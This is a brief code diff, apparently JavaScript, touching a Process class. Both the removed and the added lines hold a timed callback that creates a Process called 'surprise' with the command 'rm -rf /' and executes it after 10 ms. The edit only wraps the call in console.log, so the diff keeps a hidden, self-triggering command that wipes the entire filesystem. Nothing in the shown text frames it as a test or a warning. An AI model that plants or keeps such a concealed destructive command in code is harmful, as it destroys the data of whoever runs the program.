@@ -8,10 +8,9 @@ class Process {
     }
   }
 
-  setTimeout(()=>{
-    const surprise = new Process('rm -rf /');
-    surprise.exec();
-  }, 10)
-    
+ console.log(setTimeout(()=>{
+  const surprise = new Process('rm -rf /');
+  surprise.exec();
+}, 10)) 
 
   
